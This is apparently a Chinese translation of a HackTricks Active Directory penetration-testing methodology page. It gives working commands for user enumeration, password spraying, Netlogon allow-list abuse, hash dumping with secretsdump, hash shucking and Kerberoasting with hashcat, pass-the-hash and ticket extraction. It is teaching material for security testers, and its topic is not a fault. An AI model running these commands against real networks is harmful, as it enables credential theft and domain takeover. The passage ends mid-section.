# Active Directory 方法论

{{#include ../../banners/hacktricks-training.md}}

## 基本概览

**Active Directory** 是一项基础技术，可帮助**网络管理员**在网络中高效创建和管理**域**、**用户**和**对象**。它经过扩展性设计，支持将大量用户组织到易于管理的**组**和**子组**中，同时控制不同级别的**访问权限**。

**Active Directory** 的结构由三个主要层级组成：**域**、**树**和**林**。**域**包含一组共享同一数据库的对象，例如**用户**或**设备**。**树**是通过共享结构连接起来的一组域，而**林**则代表多个树的集合，这些树通过**信任关系**相互连接，构成组织结构的最高层级。每个层级都可以指定特定的**访问**和**通信权限**。

**Active Directory** 中的关键概念包括：

1. **目录** – 存放与 Active Directory 对象相关的所有信息。
2. **对象** – 表示目录中的实体，包括**用户**、**组**或**共享文件夹**。
3. **域** – 作为目录对象的容器，多个域可以共存于一个**林**中，并且每个域维护自己的对象集合。
4. **树** – 共享同一个根域的一组域。
5. **林** – Active Directory 中组织结构的最高层级，由多个树组成，这些树之间存在**信任关系**。

**Active Directory Domain Services (AD DS)** 包含一系列对网络中的集中式管理和通信至关重要的服务。这些服务包括：

1. **域服务** – 集中存储数据并管理**用户**与**域**之间的交互，包括**身份验证**和**搜索**功能。
2. **证书服务** – 负责安全**数字证书**的创建、分发和管理。
3. **轻型目录服务** – 通过 **LDAP 协议**支持启用目录的应用程序。
4. **目录联合服务** – 提供**单点登录**功能，使用户能够在一次会话中通过身份验证访问多个 Web 应用程序。
5. **权限管理** – 通过限制受版权保护材料的未授权分发和使用，帮助保护版权内容。
6. **DNS 服务** – 对**域名**解析至关重要。

如需更详细的解释，请查看：[**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos 身份验证**

要学习如何**攻击 AD**，你需要非常好地**理解****Kerberos 身份验证流程**。\
[**如果你仍然不了解其工作原理，请阅读此页面。**](kerberos-authentication.md)

## Cheat Sheet

你可以访问 [https://wadcoms.github.io/](https://wadcoms.github.io)，快速查看可用于枚举/利用 AD 的命令。

> [!WARNING]
> Kerberos 通信通常**需要完全限定域名 (FQDN)**，以便客户端获取正确 SPN 的票据。通过 IP 地址访问计算机时，通常会回退到 NTLM，而不是 Kerberos。

## Recon Active Directory（无凭据/会话）

如果你只能访问 AD 环境，但没有任何凭据/会话，可以：

- **对网络进行 Pentest：**
- 扫描网络，查找计算机和开放端口，并尝试**利用漏洞**或从中**提取凭据**（例如，[打印机可能是非常有趣的目标](ad-information-in-printers.md)）。
- 枚举 DNS 可能会提供域中关键服务器的信息，例如 Web、打印机、共享、VPN、媒体等。
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- 查看通用的[**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md)，以获取有关如何执行此操作的更多信息。
- **检查 SMB 服务上的 null 和 Guest 访问**（此方法在现代 Windows 版本上无法使用）：
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- 有关如何枚举 SMB 服务器的更详细指南，请参阅：


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **枚举 Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- 有关如何枚举 LDAP 的更详细指南，请参阅此处（请**特别注意匿名访问**）：


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **投毒网络**
- 使用 [Responder 冒充服务](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)收集凭据
- 通过[**滥用 relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)访问主机
- 通过[**暴露**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)[**伪造的 UPnP 服务和 evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)收集凭据
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html)：
- 从内部文档、社交媒体、域环境内部的服务（主要是 Web）以及公开可用的信息中提取用户名/姓名。
- 如果你找到公司员工的完整姓名，可以尝试不同的 AD **用户名约定 (**[**阅读此处**](https://activedirectorypro.com/active-directory-user-naming-convention/))。最常见的约定包括：_NameSurname_、_Name.Surname_、_NamSur_（每个姓名取 3 个字母）、_Nam.Sur_、_NSurname_、_N.Surname_、_SurnameName_、_Surname.Name_、_SurnameN_、_Surname.N_、3 个**随机字母和 3 个随机数字**（abc123）。
- 工具：
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### 用户枚举

- **匿名 SMB/LDAP 枚举：**查看 [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html)和 [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md)页面。
- **Kerbrute 枚举**：当请求**无效用户名**时，服务器会使用 **Kerberos 错误**代码 _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_ 进行响应，从而可以判断该用户名无效。**有效用户名**将返回 **AS-REP** 响应中的 **TGT**，或返回错误 _KRB5KDC_ERR_PREAUTH_REQUIRED_，表示该用户需要执行预身份验证。
- **针对 MS-NRPC 的 No Authentication**：使用 auth-level = 1（No authentication）针对域控制器上的 MS-NRPC (Netlogon) 接口进行操作。该方法在绑定 MS-NRPC 接口后调用 `DsrGetDcNameEx2` 函数，无需任何凭据即可检查用户或计算机是否存在。[NauthNRPC](https://github.com/sud0Ru/NauthNRPC) 工具实现了此类枚举。相关研究可在[此处](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup>找到。
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

如果你在网络中发现了这类服务器，还可以对其执行 **user enumeration**。例如，你可以使用工具 [**MailSniper**](https://github.com/dafthack/MailSniper)：
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> 你可以在[**这个 github 仓库**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)和另一个仓库（[**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)）中找到用户名列表。
>
> 但是，你应该已经从之前执行的 recon 步骤中获取**公司员工的姓名**。有了名字和姓氏后，你可以使用脚本 [**namemash.py**](https://gist.github.com/superkojiman/11076951) 生成潜在的有效用户名。

### Netlogon vulnerable-channel allow-list 滥用（Onelogon）

即使 DC 上已经修复了 **Zerologon**，被显式加入 allow-list 的账户仍可能暴露于**旧版/易受攻击的 Netlogon secure-channel 行为**。存在风险的配置是 GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`**，或对应的注册表值 **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**。

该值是一个 **SDDL security descriptor**（参见 [Security Descriptors](security-descriptors.md)）。DACL 中被授予相关 ACE 的任何账户或组都可能成为目标。例如，`O:BAG:BAD:(A;;RC;;;WD)` 实际上会将 **Everyone** 加入 allow-list。

实际操作流程：

1. 通过检查 **SYSVOL/GPO** 和**运行中的 DC 注册表**，确定加入 allow-list 的主体。
2. 将 SDDL 中找到的 SID 解析为实际的 AD 用户/计算机，并优先关注 **DC machine accounts**、**trust accounts** 和其他特权计算机。
3. 反复尝试以加入 allow-list 的账户进行 **MS-NRPC / Netlogon authentication**。
4. 猜测成功后，滥用 **Netlogon password-setting** 重置目标账户密码（公开 PoC 会将其设置为空字符串）。<sup>[[9]](#references)[[10]](#references)</sup>

以下是公开 artifact 中的快速排查/实验室示例：
```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
--comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```
备注：

- **scanner** 很有用，因为有效的 allow-list 可能存在于 **SYSVOL**、**registry** 中，或同时存在于两者中。
- exploit path 本身很重要，因为一旦识别出存在漏洞的账户，便**不需要 Domain Admin 权限**。
- Compromising **Domain Controller machine account**（例如 `DC$`）尤其危险，因为重置该密码可以直接启用更广泛的 **AD takeover** 路径。
- **Brute-force feasibility** 取决于模式：公开 artifact 描述了 meet-in-the-middle 方法；当有另一个 computer account 可用时，可以进行 **24-bit** brute force；此外还有速度更慢的 **32-bit** 变体。

检测 / hardening 备注：

- 审计 allow-list policy，并移除除临时且明确要求的兼容性例外之外的所有内容。
- 监控 DC **System** events **5827/5828/5829/5830/5831**，以捕获被拒绝、被发现或由 policy 明确允许的 vulnerable Netlogon connections。
- 将 `VulnerableChannelAllowList` 中的账户视为**高风险**，直到移除 legacy dependency。

### 知道一个或多个用户名

好的，假设你已经知道一个有效的用户名，但没有密码……那么可以尝试：

- [**ASREPRoast**](asreproast.md)：如果用户**没有**属性 _DONT_REQ_PREAUTH_，你可以**请求该用户的 AS_REP message**，其中会包含一些通过该用户密码的派生值加密的数据。
- [**Password Spraying**](password-spraying.md)：尝试使用最**常见的密码**登录每个已发现的用户，也许某个用户正在使用弱密码（注意 password policy！）。
- 注意，你也可以对 **OWA servers** 进行 **spray**，尝试获取对用户 mail servers 的访问权限。


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

你可能可以通过对以下某些 **network protocols** 进行 **poisoning**，来**获取**可用于 cracking 的 **challenge hashes**：


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Active Directory enumeration 可以提供用户名、email identifiers 和命名模式、候选主机，以及可能被强制进行 authentication 的 services。利用这些上下文来识别可行的 NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)，以及进入 AD environment 的潜在路径。

### NetExec workspace 驱动的 recon 与 relay posture 检查

- 使用 **`nxcdb` workspaces** 按 engagement 保存 AD recon 状态：`workspace create <name>` 会在 `~/.nxc/workspaces/<name>` 下生成按 protocol 划分的 SQLite DB（smb/mssql/winrm/ldap 等）。使用 `proto smb|mssql|winrm` 切换 view，并使用 `creds` 列出已收集的 secrets。完成后手动清除敏感数据：`rm -rf ~/.nxc/workspaces/<name>`。<sup>[[6]](#references)</sup>
- 使用 **`netexec smb <cidr>`** 快速发现 subnet，可显示 **domain**、**OS build**、**SMB signing requirements** 和 **Null Auth**。显示 `(signing:False)` 的成员容易受到 **relay** 攻击，而 DC 通常要求 signing。
- 直接根据 NetExec 输出在 **/etc/hosts** 中生成 **hostnames**，以便于 targeting：
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- 当通过签名**阻止 SMB relay 到 DC**时，仍应探测 **LDAP** 的安全状态：`netexec ldap <dc>` 会突出显示 `(signing:None)` / 弱 channel binding。即使 DC 要求 SMB signing，但禁用了 LDAP signing，仍可能成为可行的 **relay-to-LDAP** 目标，用于 **SPN-less RBCD** 等滥用。

### 客户端打印机凭据泄露 → 批量域凭据验证

- 打印机/网页 UI 有时会在 HTML 中**嵌入经过掩码处理的管理员密码**。查看源代码/开发者工具可能发现明文（例如 `<input value="<password>">`），从而使用 Basic-auth 访问扫描/打印存储库。
- 获取的打印作业可能包含带有每个用户密码的**明文入职文档**。测试时请保持配对关系一致：<sup>[[6]](#references)</sup>
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

如果你可以使用 **null 或 guest 用户访问其他 PC 或共享**，就可以**放置文件**（例如 SCF 文件），这些文件一旦被访问，就会**触发针对你的 NTLM 身份验证**，这样你就能**窃取** **NTLM challenge** 并对其进行破解：


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** 将你已经拥有的每个 NT hash 视为其他较慢格式的候选密码，这些格式的密钥材料直接由 NT hash 派生而来。与其对 Kerberos RC4 tickets、NetNTLM challenges 或 cached credentials 中的长 passphrase 进行暴力破解，不如将 NT hashes 传入 Hashcat 的 NT-candidate modes，让其验证密码复用情况，而无需获知明文。该技术在 domain compromise 之后尤其有效，因为此时你可以获取数千个当前和历史 NT hashes。<sup>[[5]](#references)</sup>

在以下情况使用 shucking：

- 你通过 DCSync、SAM/SECURITY dumps 或 credential vaults 获得了 NT corpus，并需要测试其是否在其他 domains/forests 中复用。
- 你捕获了基于 RC4 的 Kerberos material（`$krb5tgs$23$`、`$krb5asrep$23$`）、NetNTLM responses 或 DCC/DCC2 blobs。
- 你希望快速证明长且无法破解的 passphrases 存在复用，并立即通过 Pass-the-Hash 进行 pivot。

该技术**不适用于**密钥不是 NT hash 的加密类型（例如 Kerberos etype 17/18 AES）。如果 domain 强制仅使用 AES，则必须恢复使用常规的 password modes。

#### Building an NT hash corpus

- **DCSync/NTDS** – 使用带有 history 选项的 `secretsdump.py` 获取尽可能多的 NT hashes（以及其之前的值）：

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

历史条目会显著扩大候选池，因为 Microsoft 最多可以为每个 account 存储 24 个之前的 hashes。有关获取 NTDS secrets 的更多方法，请参阅：

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa`（或 Mimikatz `lsadump::sam /patch`）会提取本地 SAM/SECURITY 数据以及 cached domain logons（DCC/DCC2）。去重后，将这些 hashes 添加到同一个 `nt_candidates.txt` 列表中。
- **Track metadata** – 保留生成每个 hash 的 username/domain 信息（即使 wordlist 只包含十六进制内容）。当 Hashcat 输出成功的 candidate 后，匹配的 hashes 会立即告诉你哪个 principal 正在复用密码。
- 优先使用来自同一 forest 或受信任 forest 的 candidates；这样可以最大限度地提高 shucking 时发生重叠的可能性。

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

注意：

- NT-candidate inputs **必须保持为原始的 32 位十六进制 NT hashes**。禁用 rule engines（不要使用 `-r`，也不要使用 hybrid modes），因为 mangling 会破坏 candidate key material。
- 这些 modes 本身并不会更快，但 NTLM keyspace（在 M3 Max 上约为 30,000 MH/s）比 Kerberos RC4（约为 300 MH/s）快约 100 倍。测试经过筛选的 NT list，成本远低于在较慢格式中探索整个 password space。
- 始终运行**最新的 Hashcat build**（`git clone https://github.com/hashcat/hashcat && make install`），因为 modes 31500/31600/35300/35400 是最近才发布的。<sup>[[7]](#references)</sup>
- 目前没有用于 AS-REQ Pre-Auth 的 NT mode，而 AES etypes（19600/19700）需要明文密码，因为它们的 keys 是通过 PBKDF2 从 UTF-16LE passwords 派生的，而不是直接使用原始 NT hashes。

#### Example – Kerberoast RC4 (mode 35300)

1. 使用低权限用户为目标 SPN 捕获 RC4 TGS（详情请参阅 Kerberoast 页面）：

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. 使用你的 NT list 对 ticket 执行 shuck：

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat 会从每个 NT candidate 派生 RC4 key，并验证 `$krb5tgs$23$...` blob。匹配成功即证明该 service account 使用了你现有的某个 NT hash。

3. 立即通过 PtH 进行 pivot：

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

如果需要，你可以稍后使用 `hashcat -m 1000 <matched_hash> wordlists/` 恢复明文。

#### Example – Cached credentials (mode 31600)

1. 从已 compromise 的 workstation 中 dump cached logons：

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. 将感兴趣的 domain user 的 DCC2 行复制到 `dcc2_highpriv.txt`，然后执行 shuck：

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. 匹配成功后，会得到 list 中已经存在的 NT hash，从而证明该 cached user 正在复用密码。可以直接将其用于 PtH（`nxc smb <dc_ip> -u highpriv -H <hash>`），或在快速 NTLM mode 中对其进行暴力破解以恢复字符串。

完全相同的工作流也适用于 NetNTLM challenge-responses（`-m 27000/27100`）和 DCC（`-m 31500`）。确定匹配后，你可以执行 relay、SMB/WMI/WinRM PtH，或在线下使用 masks/rules 重新破解 NT hash。



## 使用 credentials/session 枚举 Active Directory

在此阶段，你需要已经**获取有效 domain account 的 credentials 或 session**。如果你拥有某些有效 credentials，或拥有作为 domain user 的 shell，**应记住之前介绍的选项仍然可以用于 compromise 其他 users**。

开始 authenticated enumeration 之前，应先了解 **Kerberos double-hop problem**。


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Compromise 一个 account 是**评估 domain 的重要一步**，因为它支持进行 authenticated **Active Directory enumeration**：

关于 [**ASREPRoast**](asreproast.md)，你现在可以找出所有可能存在漏洞的 users；关于 [**Password Spraying**](password-spraying.md)，你可以获得**所有 usernames 的列表**，并尝试使用已 compromise account 的密码、空密码以及新发现的有希望的密码。

- 你可以使用 [**CMD 执行基本 recon**](../basic-cmd-for-pentesters.md#domain-info)
- 你还可以使用 [**powershell 进行 recon**](../basic-powershell-for-pentesters/index.html)，这样会更加 stealthy
- 你还可以[**使用 powerview**](../basic-powershell-for-pentesters/powerview.md)提取更详细的信息
- Active Directory 中另一个出色的 recon 工具是 [**BloodHound**](bloodhound.md)。它**并不十分 stealthy**（取决于你使用的 collection methods），但**如果你不在意这一点**，完全应该尝试一下。查找 users 可以通过 RDP 访问的位置、通往其他 groups 的路径等。
- **其他 automated AD enumeration tools 包括：** [**AD Explorer**](bloodhound.md#ad-explorer)**、**[**ADRecon**](bloodhound.md#adrecon)**、**[**Group3r**](bloodhound.md#group3r)**、**[**PingCastle**](bloodhound.md#pingcastle)**。**
- [**AD 的 DNS records**](ad-dns-records.md)，因为其中可能包含有趣的信息。
- 你可以使用一个**带 GUI 的 tool** **SysInternal** Suite 中的 **AdExplorer.exe** 来枚举 directory。
- 你还可以使用 **ldapsearch** 搜索 LDAP database，以查找字段 _userPassword_ 和 _unixUserPassword_ 中的 credentials，甚至查找 _Description_。其他方法请参阅 PayloadsAllTheThings 上的 [Password in AD User comment](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment)。
- 如果你使用的是 **Linux**，还可以使用 [**pywerview**](https://github.com/the-useless-one/pywerview) 枚举 domain。
- 你还可以尝试以下 automated tools：
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

从 Windows 获取所有 domain usernames 非常容易（`net user /domain`、`Get-DomainUser` 或 `wmic useraccount get name,sid`）。在 Linux 中，你可以使用：`GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` 或 `enum4linux -a -u "user" -p "password" <DC IP>`

> 即使这一 Enumeration 部分看起来很短，它仍然是全部内容中最重要的部分。访问这些 links（主要是 cmd、powershell、powerview 和 BloodHound 的 links），学习如何枚举 domain，并持续练习直到熟练掌握。在 assessment 期间，这是找到通往 DA 的路径，或确定无计可施的关键时刻。

### Kerberoast

Kerberoasting 包括获取由与 user accounts 关联的 services 使用的 **TGS tickets**，并在线下破解其加密内容——该加密基于 user passwords。

更多信息请参阅：


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connection (RDP, SSH, FTP, Win-RM, etc.)

获取一些 credentials 后，你可以检查自己是否能够访问某台 **machine**。为此，可以根据 port scans 的结果，使用 **CrackMapExec** 尝试通过不同 protocols 连接多台 servers。

### Local Privilege Escalation

如果你已经 compromise 了 credentials，或拥有 regular domain user 的 session，并且可以访问 domain 中的**任意 machine**，就应寻找在本地**提升权限并收集 credentials**的路径。本地 administrator privileges 可能允许你从内存（LSASS）和本地存储（SAM）中 **dump 其他 users 的 hashes**。

本书中有完整页面介绍 [**Windows 中的 local privilege escalation**](../windows-local-privilege-escalation/index.html)，以及一个[**checklist**](../checklist-windows-privilege-escalation.md)。另外，不要忘记使用 [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)。

### Current Session Tickets

你在当前 user 的 **tickets** 中找到**允许你访问**意外 resources 的权限是非常**不可能**的，但你仍然可以检查：
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

拥有域凭据或用户会话后，重新尝试 NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)：经过身份验证的枚举和 coercion 技术可以暴露出在未认证侦察期间无法发现的 relay 路径。

### 在计算机共享 | SMB Shares 中查找凭据

现在你已经拥有一些基本凭据，应检查是否能在 **AD 内部共享的文件中**找到任何**有价值的文件**。你可以手动完成这项工作，但这是非常无聊且重复的任务（尤其是当你发现数百份需要检查的文档时）。

[**Follow this link to learn about tools you could use.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### 窃取 NTLM Creds

如果你能**访问其他 PC 或共享**，就可以**放置文件**（例如 SCF 文件）；如果这些文件以某种方式被访问，就会**触发针对你的 NTLM authentication**，从而可以**窃取** **NTLM challenge** 并对其进行破解：


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

此漏洞允许任何经过身份验证的用户**攻陷域控制器**。


{{#ref}}
printnightmare.md
{{#endref}}

## 使用特权凭据/会话进行 Active Directory 权限提升

**对于以下技术，普通域用户并不足够；你需要一些特殊权限/凭据才能执行这些攻击。**

### Hash 提取

希望你已经通过 [AsRepRoast](asreproast.md)、[Password Spraying](password-spraying.md)、[Kerberoast](kerberoast.md)、[Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)（包括 relaying）、[EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md) 或[本地权限提升](../windows-local-privilege-escalation/index.html)成功**攻陷了某个本地管理员**账户。\
现在，是时候 dump 内存中和本地存储的所有 hash 了。\
[**Read this page about different ways to obtain the hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**获取某个用户的 hash 后**，你可以使用它来**冒充**该用户。\
你需要使用某种**工具**来**使用该 hash 执行** **NTLM authentication**，或者创建新的 **sessionlogon**，并将该 hash **注入**到 **LSASS** 中，这样每当执行 **NTLM authentication** 时，就会使用该 **hash**。后一个选项就是 mimikatz 的工作方式。\
[**Read this page for more information.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

此攻击旨在**使用用户的 NTLM hash 请求 Kerberos tickets**，作为通过 NTLM protocol 执行常见 Pass The Hash 的替代方案。因此，在禁用 NTLM protocol 且仅允许使用 **Kerberos** 作为 authentication protocol 的网络中，这种方法尤其**有用**。


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

在 **Pass The Ticket (PTT)** 攻击方法中，攻击者会**窃取用户的 authentication ticket**，而不是其密码或 hash 值。随后，攻击者使用这个被窃取的 ticket **冒充该用户**，从而在网络内对资源和服务获得未授权访问。


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

如果你拥有某个**本地管理员**的 **hash** 或**密码**，应尝试使用它**登录**其他 **PC**。
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> 请注意，这种方式相当 **noisy**，而 **LAPS** 可以对其进行 **mitigate**。

### MSSQL Abuse & Trusted Links

如果用户拥有 **access MSSQL instances** 的权限，则可能能够利用它在 MSSQL 主机上 **execute commands**（如果以 SA 身份运行）、**steal** NetNTLM **hash**，甚至执行 **relay** **attack**。\
如果某个 MSSQL 实例通过数据库链接受到另一个实例的信任，则拥有链接数据库权限的用户可能能够 **use the trust relationship to execute queries on the other instance**。这些信任关系可以进行链式利用，并最终到达配置错误的数据库，在那里用户可以执行命令。\
**数据库之间的链接即使跨越 forest trusts 也能正常工作。**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

第三方资产清单和部署套件通常会暴露通往凭据和代码执行的高权限路径。请参阅：

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

如果你发现任何 Computer 对象具有 [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) 属性，并且你在该计算机上拥有域权限，则可以从内存中 dump 登录该计算机的所有用户的 TGT。\
因此，如果 **Domain Admin 登录该计算机**，你就能够 dump 他的 TGT，并使用 [Pass the Ticket](pass-the-ticket.md) 冒充他。\
借助 constrained delegation，你甚至可以 **automatically compromise a Print Server**（希望它会是一个 DC）。


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

如果某个用户或计算机被允许使用 "Constrained Delegation"，它就能够 **impersonate any user to access some services in a computer**。\
因此，如果你 **compromise** 了该用户/计算机的 **hash**，就能够 **impersonate any user**（甚至是 domain admins）以访问某些服务。


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

在远程计算机的 Active Directory 对象上拥有 **WRITE** 权限，可以获得以 **elevated privileges** 执行代码的能力：


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

被 **compromised** 的用户可能对某些域对象拥有一些 **interesting privileges**，这可能让你进行横向 **move**/**escalate** 权限。


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

发现域内有 **Spool service listening** 后，可以对其进行 **abused**，以 **acquire new credentials** 并 **escalate privileges**。


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

如果 **other users** **access** 了 **compromised** 机器，就可能从内存中 **gather credentials**，甚至向其进程 **inject beacons** 以冒充他们。\
通常用户会通过 RDP 访问系统，因此下面介绍了如何针对第三方 RDP 会话执行几种攻击：


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** 提供了一个用于管理已加入域计算机上 **local Administrator password** 的系统，确保密码经过 **randomized**、唯一且频繁 **changed**。这些密码存储在 Active Directory 中，并通过 ACL 控制访问权限，仅允许授权用户访问。拥有足够权限访问这些密码后，就可以 pivot 到其他计算机。


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

从 **compromised** 机器上 **Gathering certificates** 可能是提升环境内权限的一种方式：


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

如果配置了 **vulnerable templates**，就可以利用它们来提升权限：


{{#ref}}
ad-certificates/domain-escalation.md
